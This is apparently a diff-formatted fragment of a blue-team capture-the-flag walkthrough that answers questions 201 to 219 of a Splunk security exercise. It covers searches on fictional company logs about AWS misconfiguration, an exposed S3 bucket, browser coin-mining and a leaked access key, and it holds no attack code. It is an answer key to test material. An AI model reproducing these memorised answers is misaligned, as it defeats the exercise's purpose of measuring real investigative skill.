+<p>bstoll,btun,splunk_access,web_admin</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="201----what-field-would-you-use-to-alert-that-aws-api-activity-have-occurred-without-mfa-multi-factor-authentication">201 -|- What field would you use to alert that AWS API activity have occurred without MFA (multi-factor authentication)?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*aws*&#34;</span> *MFA*
+</code></pre></div><p>Looking through the events to see where MFA is mentioned, and you find the field name.</p>
+<blockquote>
+<p>userIdentity.sessionContext.attributes.mfaAuthenticated</p>
+</blockquote>
+<p>More info: <a href="https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail-additional-examples.html#cloudwatch-alarms-for-cloudtrail-no-mfa-example" target="_blank">https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail-additional-examples.html#cloudwatch-alarms-for-cloudtrail-no-mfa-example</a></p>
+<p><br/><br/></p>
+<h3 id="202----what-is-the-processor-number-used-on-the-web-servers">202 -|- What is the processor number used on the web servers?</h3>
+<p>Common processors are Intel and AMD, so check those first.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>intel OR amd<span style="color:#f92672">)</span>
+</code></pre></div><p>This gives over 3000 events. Looking at the sourcetypes to see what stands out, there&rsquo;s <code>hardware</code> (3 events) and <code>osquery:results</code> (4 events)</p>
+<p>Check <code>hardware</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hardware&#34;</span> <span style="color:#f92672">(</span>intel OR amd<span style="color:#f92672">)</span>
+</code></pre></div><p><code>CPU_TYPE Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz</code> for hosts: <em>gacrux.i-06fea586f3d3c8ce8</em>, <em>gacrux.i-09cbc261e84259b54</em>, <em>gacrux.i-0cc93bade2b3cba63</em></p>
+<p>Check <code>osquery:results</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;osquery:results&#34;</span> <span style="color:#f92672">(</span>intel OR amd<span style="color:#f92672">)</span>
+</code></pre></div><p><code>cpu_brand: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz</code> for hosts <em>gacrux.i-06fea586f3d3c8ce8</em>, <em>gacrux.i-0cc93bade2b3cba63</em></p>
+<p>I think we have the answer, but let&rsquo;s check that those hosts web servers:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;gacrux.i-06fea586f3d3c8ce8&#34;</span> OR host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;gacrux.i-09cbc261e84259b54&#34;</span>
+  OR host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;gacrux.i-0cc93bade2b3cba63&#34;</span>
+</code></pre></div><p>The most common process is <code>httpd</code>, and <code>stream:http</code> has <code>server: Apache/2.2.34 (Amazon)</code>. Looks good.</p>
+<blockquote>
+<p>E5-2676</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="203----bud-accidentally-makes-an-s3-bucket-publicly-accessible-what-is-the-event-id-of-the-api-call-that-enabled-public-access">203 -|- Bud accidentally makes an S3 bucket publicly accessible. What is the event ID of the API call that enabled public access?</h3>
+<p>Searching AWS docs for ACLs we find <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/acl-overview.html" target="_blank">https://docs.aws.amazon.com/AmazonS3/latest/dev/acl-overview.html</a>. It mentions the <code>PutBucketAcl</code> event is for changing access, and the <code>AllUsers</code> value is for public access:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:cloudtrail&#34;</span> eventName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PutBucketAcl&#34;</span> AllUsers
+</code></pre></div><blockquote>
+<p>ab45689d-69cd-41e7-8705-5350402cf7ac</p>
+</blockquote>
+<p>Time = 13:01:46</p>
+<p><br/><br/></p>
+<h3 id="204----what-is-the-name-of-the-s3-bucket-that-was-made-publicly-accessible">204 -|- What is the name of the S3 bucket that was made publicly accessible?</h3>
+<p>Same as previous question</p>
+<blockquote>
+<p>frothlywebcode</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="205----what-is-the-name-of-the-text-file-that-was-successfully-uploaded-into-the-s3-bucket-while-it-was-publicly-accessible">205 -|- What is the name of the text file that was successfully uploaded into the S3 bucket while it was publicly accessible?</h3>
+<p>We know the sourcetype, bucket name, and when it was made public. &ldquo;While it was&rdquo; suggests it was later made publicly inaccessible, suggesting at least two <code>PutBucketAcl</code> events - making it public, then making it private:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:cloudtrail&#34;</span> eventName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PutBucketAcl&#34;</span>
+  <span style="color:#e6db74">&#34;requestParameters.bucketName&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;frothlywebcode&#34;</span>
+</code></pre></div><p>2 events, one allowing public access (13:01:46), one stopping (13:57:54). Looking between these times for a text file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:cloudtrail&#34;</span> earliest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8/20/2018:13:01:46&#34;</span> latest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:13:57:54&#34;</span>
+  <span style="color:#e6db74">&#34;requestParameters.bucketName&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;frothlywebcode&#34;</span> *.txt
+</code></pre></div><p>Gives nothing. So let&rsquo;s branch out - all AWS sourcetypes, and any mention of <em>frothlywebcode</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*aws*&#34;</span> earliest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:13:01:46&#34;</span> latest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:13:57:54&#34;</span>
+  frothlywebcode *.txt
+</code></pre></div><p>3 events. It was uploaded, and if we check the <code>operation</code> field and there&rsquo;s 1 <code>aws:s3:accesslogs</code> event for PUT.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:s3:accesslogs&#34;</span>
+  earliest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:13:01:46&#34;</span> latest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:13:57:54&#34;</span>
+  frothlywebcode *.txt operation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;REST.PUT.OBJECT&#34;</span>
+</code></pre></div><blockquote>
+<p>OPEN_BUCKET_PLEASE_FIX.txt</p>
+</blockquote>
+<p>Time = 13:02:44</p>
+<p><br/><br/></p>
+<h3 id="206----what-is-the-size-in-megabytes-of-the-targz-file-that-was-successfully-uploaded-into-the-s3-bucket-while-it-was-publicly-accessible">206 -|- What is the size (in megabytes) of the .tar.gz file that was successfully uploaded into the S3 bucket while it was publicly accessible?</h3>
+<p>As before, but a .tar.gz file. Only 1 event.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:s3:accesslogs&#34;</span>
+  earliest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:13:01:46&#34;</span> latest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:13:57:54&#34;</span>
+  frothlywebcode *.tar.gz operation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;REST.PUT.OBJECT&#34;</span>
+</code></pre></div><p>Then use Splunk functions to convert it to MB</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:s3:accesslogs&#34;</span>
+  earliest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:13:01:46&#34;</span> latest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:13:57:54&#34;</span>
+  frothlywebcode *.tar.gz operation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;REST.PUT.OBJECT&#34;</span>
+| eval size_mb <span style="color:#f92672">=</span> round<span style="color:#f92672">(</span>object_size/1024/1024,2<span style="color:#f92672">)</span>
+| table key size_mb
+</code></pre></div><blockquote>
+<p>2.93</p>
+</blockquote>
+<p>Filename (<code>key</code>) = frothly_html_memcached.tar.gz</p>
+<p>Time = 13:04:17</p>
+<p><br/><br/></p>
+<h3 id="208----a-frothly-endpoint-exhibits-signs-of-coin-mining-activity-what-is-the-name-of-the-first-process-to-reach-100-percent-cpu-processor-utilization-time-from-this-activity-on-this-endpoint">208 -|- A Frothly endpoint exhibits signs of coin mining activity. What is the name of the first process to reach 100 percent CPU processor utilization time from this activity on this endpoint?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cpu
+</code></pre></div><p>A few fields jump out. <code>cpu_load_percent</code>, <code>cpu_user_percent</code>, <code>pctCPU</code>, and <code>process_cpu_used_percent</code>. Try all of these with 100:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cpu_load_percent<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span> OR cpu_user_percent<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>
+  OR pctCPU<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span> OR process_cpu_used_percent<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>
+</code></pre></div><p>The source/sourcetype <code>PerfmonMk:Process</code> has some events and also mentions processes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PerfmonMk:Process&#34;</span> process_cpu_used_percent<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>
+| reverse
+</code></pre></div><p>The first event is Edge, at 09:36:26. At 13:37:50 and 13:38:20 there are 2 events for <em>chrome#5</em>, then 129 100% events for <em>chrome#4</em>, only finishing at 14:04:11 when <em>MsMpEng.exe</em> kicks in, which is part of Windows Defender. My feeling is Edge is unrelated to the mining.</p>
+<blockquote>
+<p>chrome#5</p>
+</blockquote>
+<p>Time = 13:37:50</p>
+<p>Host = BSTOLL-L</p>
+<p><br/><br/></p>
+<h3 id="209----when-a-frothly-web-server-ec2-instance-is-launched-via-auto-scaling-it-performs-automated-configuration-tasks-after-the-instance-starts-how-many-packages-and-dependent-packages-are-installed-by-the-cloud-initialization-script">209 -|- When a Frothly web server EC2 instance is launched via auto scaling, it performs automated configuration tasks after the instance starts. How many packages and dependent packages are installed by the cloud initialization script?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ec2 packages
+</code></pre></div><p>1232 events. Most are for sourcetype <code>lsof</code>, which isn&rsquo;t helpful. The other two, <code>cloud-init</code> and <code>osquery:results</code> also do not seem to have useful information. However, <code>cloud-init</code> sounds promising (as we&rsquo;re looking for cloud initialisation scripts), and there&rsquo;s a similar sourcetype, <code>cloud-init-output</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cloud-init-output&#34;</span> packages
+</code></pre></div><p>There&rsquo;s only 6 events, and manually looking through we find the answer.</p>
+<blockquote>
+<p>7 (13)</p>
+</blockquote>
+<p>Times = 13:33:24 (host = gacrux.i-0cc93bade2b3cba63), 14:23:19 (host = gacrux.i-06fea586f3d3c8ce8), 14:25:21 (host = gacrux.i-09cbc261e84259b54)</p>
+<p><br/><br/></p>
+<h3 id="210----what-is-the-short-hostname-of-the-only-frothly-endpoint-to-actually-mine-monero-cryptocurrency">210 -|- What is the short hostname of the only Frothly endpoint to actually mine Monero cryptocurrency?</h3>
+<p>Q208 suggests it was mining using Chrome, so Google for phrases similar to &ldquo;popular monero coin miner web browser&rdquo; and we find several mentions to Coinhive.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">coinhive
+</code></pre></div><p>34 events, across 3 hosts. Most are DNS events, and most are for <em>BSTOLL-L</em>, which had 100% CPU in the previous answer - the others are <em>MKRAEUS-L</em> and <em>splunkhwf.froth.ly</em>.</p>
+<p>It seems <em>splunkhwf.froth.ly</em> has <code>cisconvmflowdata</code> events relating to BudStoll, so we&rsquo;re down to two hosts, with BSTOLL-L the most likely.</p>
+<p>Comparing <em>BSTOLL-L</em> and <em>MKRAEUS-L</em>, and looking at DNS events relating to the Coinhive servers, the latter only has DNS responses, whereas the former has DNS queries also. Everything is pointing to one answer.</p>
+<blockquote>
+<p>BSTOLL-L</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="211----how-many-cryptocurrency-mining-destinations-are-visited-by-frothly-endpoints">211 -|- How many cryptocurrency mining destinations are visited by Frothly endpoints?</h3>
+<p>Based on the previous question findings:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;BSTOLL-L&#34;</span> source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:dns&#34;</span> coinhive
+| stats dc<span style="color:#f92672">(</span>query<span style="color:#f92672">)</span>
+
+<span style="color:#75715e"># OR</span>
+
+source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cisconvmflowdata&#34;</span> coinhive
+| stats dc<span style="color:#f92672">(</span>dh<span style="color:#f92672">)</span>
+</code></pre></div><blockquote>
+<p>6</p>
+</blockquote>
+<p>DNS queries to: coinhive[.]com (2x), ws001.coinhive[.]com, ws005.coinhive[.]com, ws011.coinhive[.]com, ws014.coinhive[.]com, ws019.coinhive[.]com</p>
+<p>Times = 13:37:33 ~ 13:39:20</p>
+<p><br/><br/></p>
+<h3 id="212----using-splunks-event-order-functions-what-is-the-first-seen-signature-id-of-the-coin-miner-threat-according-to-frothlys-symantec-endpoint-protection-sep-data">212 -|- Using Splunk&rsquo;s event order functions, what is the first seen signature ID of the coin miner threat according to Frothly&rsquo;s Symantec Endpoint Protection (SEP) data?</h3>
+<p>We know the host <code>SEPM</code> has all the SEP data, and we&rsquo;re looking for a signature.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SEPM&#34;</span> *signature*
+</code></pre></div><p>53 events. There are fields <code>CIDS_Signature_ID</code> and <code>CIDS_Signature_String</code>. The IDs are <em>30356</em> and <em>30358</em>, for <em>JSCoinMiner 6</em> and <em>JSCoinMiner 8</em> respectively.</p>
+<p>Search all events with <code>CIDS_Signature_ID</code>, and find the first one.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SEPM&#34;</span> CIDS_Signature_ID<span style="color:#f92672">=</span>*
+| stats first<span style="color:#f92672">(</span>CIDS_Signature_ID<span style="color:#f92672">)</span>
+</code></pre></div><blockquote>
+<p>30358</p>
+</blockquote>
+<p>Events = 46 (23x JSCoinMiner 6, 23x JSCoinMiner 8)</p>
+<p>Time = 13:37:40 ~ 13:46:47</p>
+<p><br/><br/></p>
+<h3 id="213----according-to-symantecs-website-what-is-the-severity-of-this-specific-coin-miner-threat">213 -|- According to Symantec&rsquo;s website, what is the severity of this specific coin miner threat?</h3>
+<p>Google the phrase &ldquo;Symantec &ldquo;Web Attack: JSCoinminer&rdquo;&rdquo;</p>
+<p><a href="https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=30356" target="_blank">Attack Signature Detail Page</a></p>
+<blockquote>
+<p>Medium</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="214----what-is-the-short-hostname-of-the-only-frothly-endpoint-to-show-evidence-of-defeating-the-cryptocurrency-threat">214 -|- What is the short hostname of the only Frothly endpoint to show evidence of defeating the cryptocurrency threat?</h3>
+<p>As Q212. The assumption is Symantec finding the thread is defeating it. Check the fields, there is only a single <code>Host_Name</code></p>
+<blockquote>
+<p>BTUN-L</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="215----what-is-the-fqdn-of-the-endpoint-that-is-running-a-different-windows-operating-system-edition-than-the-others">215 -|- What is the FQDN of the endpoint that is running a different Windows operating system edition than the others?</h3>
+<p>The endpoints all have Windows logs, so let&rsquo;s see if at least one endpoint is running Windows 10:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#34;windows 10&#34;</span>
+</code></pre></div><p>It seems there is a source called &ldquo;operatingsystem&rdquo; - useful.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;operatingsystem&#34;</span>
+| stats values<span style="color:#f92672">(</span>host<span style="color:#f92672">)</span> by os
+</code></pre></div><p>So what&rsquo;s his FQDM? Windows logs will probably help:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;BSTOLL-L&#34;</span> sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wineventlog&#34;</span>
+</code></pre></div><p>And this gives us <code>ComputerName</code>, which is the FQDN.</p>
+<p><em>Alternatively&hellip;</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#34;windows 10&#34;</span>
+</code></pre></div><p><code>cisconvmsysdata</code> also has 11 events:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cisconvmsysdata&#34;</span> <span style="color:#e6db74">&#34;windows 10&#34;</span>
+</code></pre></div><p>Having a look there are fields <code>ose</code> with operating system and <code>vsn</code> with the user&rsquo;s FQDM:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cisconvmsysdata&#34;</span>
+| stats values<span style="color:#f92672">(</span>vsn<span style="color:#f92672">)</span> by ose
+</code></pre></div><blockquote>
+<p>BSTOLL-L.froth.ly</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="216----according-to-the-cisco-nvm-flow-logs-for-how-many-seconds-does-the-endpoint-generate-monero-cryptocurrency">216 -|- According to the Cisco NVM flow logs, for how many seconds does the endpoint generate Monero cryptocurrency?</h3>
+<p>From Q210:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cisconvmflowdata&#34;</span> coinhive
+</code></pre></div><p>There are a few fields that look interesting, especially <code>fes</code>, <code>fet</code>, <code>fss</code>, <code>fst</code>. It seems these stand for flow end seconds, flow end time, flow start seconds, flow start time.</p>
+<p>Using some built-in Splunk commands, we can work out the time taken:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cisconvmflowdata&#34;</span> coinhive
+| stats min<span style="color:#f92672">(</span>fss<span style="color:#f92672">)</span> as starttime, max<span style="color:#f92672">(</span>fes<span style="color:#f92672">)</span> as endtime
+| eval timetaken <span style="color:#f92672">=</span> endtime-starttime
+| table timetaken
+</code></pre></div><blockquote>
+<p>1667</p>
+</blockquote>
+<p><em>Although the answers say 1666&hellip;</em></p>
+<p>Times = 13:37:51 ~ 14:05:23</p>
+<p><br/><br/></p>
+<h3 id="217----what-kind-of-splunk-visualization-was-in-the-first-file-attachment-that-bud-emails-to-frothly-employees-to-illustrate-the-coin-miner-issue">217 -|- What kind of Splunk visualization was in the first file attachment that Bud emails to Frothly employees to illustrate the coin miner issue?</h3>
+<p>It&rsquo;s an email, so to start with <code>stream:smtp</code> with &ldquo;Bud&rdquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:smtp&#34;</span> bud
+</code></pre></div><p>Checking the <code>sender</code> field gives us his email, so replace the search term with that&quot;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:smtp&#34;</span> sender<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Bud Stoll &lt;bstoll@froth.ly&gt;&#34;</span>
+</code></pre></div><p>11 events. Perhaps he mentioned &ldquo;Splunk&rdquo; in <code>content</code> of the email:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:smtp&#34;</span> sender<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Bud Stoll &lt;bstoll@froth.ly&gt;&#34;</span> content<span style="color:#f92672">{}=</span><span style="color:#e6db74">&#34;*splunk*&#34;</span>
+</code></pre></div><p>1 result. There are two attachments, <em>image002.jpg</em> and <em>image003.jpg</em>. Both are base64 encoded, the encoded text being with the <code>content</code> field. Decode them using <a href="https://base64.guru/converter/decode/image" target="_blank">https://base64.guru/converter/decode/image</a></p>
+<p><strong>image002.jpg</strong></p>
+<p><img src="../img/botsv3_img1.png" alt="botsv3_img1"></p>
+<p><strong>image003.jpg</strong></p>
+<p><img src="../img/botsv3_img2.png" alt="botsv3_img2"></p>
+<p>This is the one we&rsquo;re looking for.</p>
+<blockquote>
+<p>column chart</p>
+</blockquote>
+<p>Time = 13:56:27</p>
+<p>Email date = 15/9/2018 02:44:24</p>
+<p><br/><br/></p>
+<h3 id="218----what-iam-user-access-key-generates-the-most-distinct-errors-when-attempting-to-access-iam-resources">218 -|- What IAM user access key generates the most distinct errors when attempting to access IAM resources?</h3>
+<p>Use the same base IAMUser search we used in Q200, but filter out successful events:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:cloudtrail&#34;</span> user_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IAMUser&#34;</span> errorCode!<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;success&#34;</span>
+</code></pre></div><p>1040 events. This is all IAMUser <code>user_type</code> errors, but the question wants errors when they are &ldquo;attempting to access IAM resources&rdquo;. There is an <code>eventSource</code> field, with ec2, s3, and iam as options. We want iam.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:cloudtrail&#34;</span> user_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IAMUser&#34;</span> errorCode!<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;success&#34;</span>
+  eventSource<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;iam.amazonaws.com&#34;</span>
+</code></pre></div><p>17 events. Looking at the events and fields, the user access key is <code>userIdentity.accessKeyId</code>, and there are 2 unique <code>errorCode</code> values and 6 unique <code>errorMessage</code> values.</p>
+<p>Use Splunk&rsquo;s stats to find the key with most unique <code>errorCode</code> events:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:cloudtrail&#34;</span> user_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IAMUser&#34;</span> errorCode!<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;success&#34;</span>
+  eventSource<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;iam.amazonaws.com&#34;</span>
+| stats dc<span style="color:#f92672">(</span>errorCode<span style="color:#f92672">)</span> as errors by userIdentity.accessKeyId
+| sort -errors
+</code></pre></div><p>But they all have 1 each. No winner. Try <code>errorMessage</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:cloudtrail&#34;</span> user_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IAMUser&#34;</span> errorCode!<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;success&#34;</span>
+  eventSource<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;iam.amazonaws.com&#34;</span>
+| stats dc<span style="color:#f92672">(</span>errorMessage<span style="color:#f92672">)</span> as errors by userIdentity.accessKeyId
+| sort -errors
+</code></pre></div><blockquote>
+<p>AKIAJOGCDXJ5NW5PXUPA</p>
+</blockquote>
+<p>Times = 09:16:12 ~ 09:27:07 (for above key)</p>
+<p>Events = <code>ListAccessKeys</code>, <code>CreateAccessKey</code>, <code>CreateUser</code>, <code>DeleteAccessKey</code>, <code>GetUser</code></p>
+<p>Source IPs = 35.153.154.221 (x4), 209.107.196.112, 82.102.18.111</p>
+<p>User Agents = Boto3 Linux (x4), Boto3 Windows, ElasticWolf</p>
+<p><br/><br/></p>
+<h3 id="219----bud-accidentally-commits-aws-access-keys-to-an-external-code-repository-shortly-after-he-receives-a-notification-from-aws-that-the-account-had-been-compromised-what-is-the-support-case-id-that-amazon-opens-on-his-behalf">219 -|- Bud accidentally commits AWS access keys to an external code repository. Shortly after, he receives a notification from AWS that the account had been compromised. What is the support case ID that Amazon opens on his behalf?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws support <span style="color:#66d9ef">case</span>
+</code></pre></div><p>4 events. One is an email from Amazon with case ID. Easy!</p>
+<blockquote>
+<p>5244329601</p>
+</blockquote>
+<p>Time = 09:16:55</p>
+<p><br/><br/></p>
